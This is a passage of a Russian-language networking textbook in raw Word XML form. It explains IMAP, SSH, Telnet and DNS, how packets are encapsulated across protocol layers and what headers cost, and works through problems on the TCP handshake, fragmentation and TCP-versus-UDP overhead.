        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно работать с почтой с любого устройства (синхронизация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Экономия места (письма на сервере)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует постоянного подключения к интернету</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Сейчас почти все используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Gmail, Outlook, и т.д.).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SSH (Secure Shell) — удалённое управление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>безопасного удалённого доступа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к серверу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 22</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: Всё шифруется (команды, пароли, данные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что можно делать через SSH</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подключиться к серверу и выполнять команды (`ssh user@server`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Передавать файлы (`scp`, `sftp`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пробрасывать порты (SSH tunneling)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запускать X11-приложения удалённо</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ssh admin@192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ты вводишь пароль (или используешь SSH-ключ) → подключаешься к серверу → можешь выполнять команды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: SSH — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>стандарт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для удалённого управления Linux/Unix-серверами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Telnet — устаревший SSH</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Telnet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для удалённого доступа, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>без шифрования</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 23</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Проблема**: Всё передаётся **в открытом виде** (пароли, команды)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>НЕ ИСПОЛЬЗУЙ TELNET</w:t>
      </w:r>
      <w:r>
        <w:t>. Он устарел ещё в 1990-х. Используй SSH.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>DNS (Domain Name System) — уже разбирали в главе 8.01</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол для преобразования доменных имён в IP-адреса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Порт**: 53</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспорт**: **UDP** (для коротких запросов), **TCP** (для длинных ответов или зонного трансфера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему UDP?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">DNS-запросы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>короткие</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (обычно &lt;512 байт), поэтому проще использовать UDP (не нужно устанавливать соединение). Если ответ не пришёл → клиент повторяет запрос.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.7. Инкапсуляция: как пакет оборачивается слоями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инкапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс оборачивания данных заголовками на каждом уровне стека.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты отправляешь HTTP-запрос `GET /index.html`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладной уровень (HTTP)**: Создаётся HTTP-запрос (текст):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   GET /index.html HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Host: example.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспортный уровень (TCP)**: HTTP-запрос оборачивается в **TCP-сегмент**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляются порты (Source: 54321, Destination: 80)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляются Sequence Number, ACK, флаги</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевой уровень (IP)**: TCP-сегмент оборачивается в **IP-пакет**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляются IP-адреса (Source: 192.168.1.100, Destination: 93.184.216.34)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляются TTL, Protocol (6 = TCP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Канальный уровень (Ethernet)**: IP-пакет оборачивается в **Ethernet-кадр**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляются MAC-адреса (Source: твоя сетевая карта, Destination: роутер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляется контрольная сумма (CRC)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Физический уровень**: Кадр преобразуется в **электрические сигналы** (или световые импульсы для оптоволокна) и передаётся по кабелю.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>На приёмной стороне</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> происходит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>декапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (обратный процесс): снимаются заголовки слой за слоем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Размер пакета: сколько служебной информации?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты отправляешь 100 байт данных через HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Уровень | Заголовок | Размер |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|-----------|--------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| HTTP | `GET / HTTP/1.1\r\nHost: example.com\r\n\r\n` | ~35 байт |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| TCP | Source/Dest Port, Seq, ACK, Flags, Window | 20 байт |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| IP | Source/Dest IP, TTL, Protocol | 20 байт |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Ethernet | Source/Dest MAC, Type, CRC | 18 байт |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 35 (HTTP) + 20 (TCP) + 20 (IP) + 18 (Ethernet) = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>93 байта</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> заголовков!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если полезные данные = 100 байт, то </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>общий размер пакета</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 193 байта.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эффективность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 100 / 193 ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>52%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Почти </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>половина трафика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это заголовки!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для коротких сообщений (например, ping) эффективность </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>очень низкая</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Для больших файлов (гигабайты) заголовки — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ничто</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (&lt;1%).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.8. Примеры задач и расчётов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Время установки TCP-соединения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Клиент в Москве подключается к серверу в Нью-Йорке. RTT (Round-Trip Time) = 120 мс. Сколько времени займёт установка TCP-соединения?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">TCP использует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>трёхстороннее рукопожатие</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Сервер: SYN (**0.5 RTT**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер → Клиент: SYN-ACK (**1 RTT**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент → Сервер: ACK (**1.5 RTT**)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>После третьего шага клиент может начать отправлять данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время установки соединения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.5 × RTT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 1.5 × 120 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>180 мс</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: 180 мс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Размер TCP-пакета с данными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Клиент отправляет 500 байт данных через TCP/IP. Рассчитай общий размер IP-пакета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Данные**: 500 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP-заголовок**: 20 байт (минимум)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IP-заголовок**: 20 байт (IPv4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Общий размер IP-пакета</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 500 + 20 + 20 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>540 байт</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: 540 байт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Фрагментация пакета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Приложение отправляет 3000 байт данных через TCP/IP. MTU канала = 1500 байт. На сколько IP-пакетов будет разбито сообщение?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Размер TCP-сегмента** = 3000 (данные) + 20 (TCP-заголовок) = **3020 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Размер IP-пакета (без фрагментации)** = 3020 + 20 (IP-заголовок) = **3040 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**MTU = 1500 байт** → пакет нужно фрагментировать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Полезная нагрузка на фрагмент** = MTU - IP-заголовок = 1500 - 20 = **1480 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество фрагментов**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагмент 1: 1480 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагмент 2: 1480 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагмент 3: 3020 - 1480 - 1480 = **60 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3 IP-пакета</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (фрагмента).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Сравнение TCP и UDP (накладные расходы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Нужно отправить 10 сообщений по 100 байт каждое. Сравни общий объём трафика для TCP и UDP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заголовок UDP: 8 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заголовок IP: 20 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер одного пакета: 100 + 8 + 20 = **128 байт**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всего: 10 × 128 = **1280 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заголовок TCP: 20 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заголовок IP: 20 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер одного сегмента: 100 + 20 + 20 = **140 байт**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всего: 10 × 140 = **1400 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> TCP требует:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Установку соединения: 3 пакета (SYN, SYN-ACK, ACK) ≈ 120 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закрытие соединения: 4 пакета (FIN, ACK, FIN, ACK) ≈ 160 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого TCP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1400 + 120 + 280 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1680 байт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого UDP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1280 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: UDP на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>31% эффективнее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для коротких сообщений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: HTTP-запрос и ответ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
